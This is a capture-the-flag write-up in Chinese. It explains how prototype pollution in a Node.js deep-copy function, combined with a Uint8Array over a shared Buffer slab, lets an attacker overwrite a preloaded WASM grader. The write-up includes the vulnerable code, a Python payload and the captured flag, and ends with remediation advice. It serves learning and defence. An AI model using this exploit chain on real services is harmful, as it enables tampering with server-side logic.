# Proto grader

## 题目简述

后端把用户 JSON 深拷贝到普通对象，再把十六进制字符串解码为 `Uint8Array`，最后用预加载的 WebAssembly 计算输入与 flag 的编辑距离。利用链先污染 `Object.prototype.size`，再借 Node.js 小 Buffer 共用 8192 字节 slab 的行为，从错误的 ArrayBuffer 起点覆盖同一 slab 中的 WASM 字节码，使评分函数恒定返回 0。

## 解题过程

递归拷贝没有阻止 `__proto__`：

```javascript
function copy(src, dst) {
    for (const key of Object.keys(src)) {
        if (is_object(src[key])) copy(src[key], dst[key]);
        else dst[key] = src[key];
    }
}
```

目标对象初始为 `{}`。处理 `__proto__` 时，`dst["__proto__"]` 指向 `Object.prototype`，所以载荷可在那里写入 `size`。配置文件只有 `length` 而没有自有属性 `size`，随后的 `config.size` 会沿原型链读到污染值。

第二个漏洞位于：

```javascript
const buf = new Uint8Array(Buffer.from("a".repeat(length)).buffer);
```

小 `Buffer` 通常只是共享 slab 中的一段；`.buffer` 返回整个底层 ArrayBuffer，而代码忽略 `byteOffset` 与 `byteLength`。因此 `Uint8Array` 从 slab 的索引 0 开始，十六进制解码循环会覆盖其他仍引用该 slab 的 Buffer。程序此前读取的 737 字节 `grader.wasm` 恰好也位于其中，实测偏移为 424。

在官方 AssemblyScript 生成的 WAT 中做等长修改，让导出的 `levenshtein` 无论输入为何都返回 0，再编译成仍为 737 字节的 `solution.wasm`。请求体为：

```python
wasm = open("solution.wasm", "rb").read()
offset = 424

payload = {
    "__proto__": {"size": offset + len(wasm)},
    "input": "ff" * offset + wasm.hex(),
}
```

污染后的长度 1161 仍落在共享 slab 分配范围内。解码先覆盖 424 字节无关区域，再把替换模块精确写到原 `code` Buffer 所指位置。评分端实例化被修改的模块并得到 0；代理判断结果小于 3，返回：

```text
grey{n0d3j5_3v3ry7h1n6_p0llu710n}
```

## 方法总结

本题的两种“污染”缺一不可：原型污染控制本不存在的配置项，共享 Buffer 误用把逻辑长度扩展成跨对象写入。深拷贝应拒绝 `__proto__`、`prototype`、`constructor` 并使用无原型对象；二进制解码应直接使用 `Buffer.from(str, "hex")`，或创建视图时同时传入正确的 `byteOffset` 和长度。对安全关键 WASM 还应避免与不可信缓冲区共享存储。
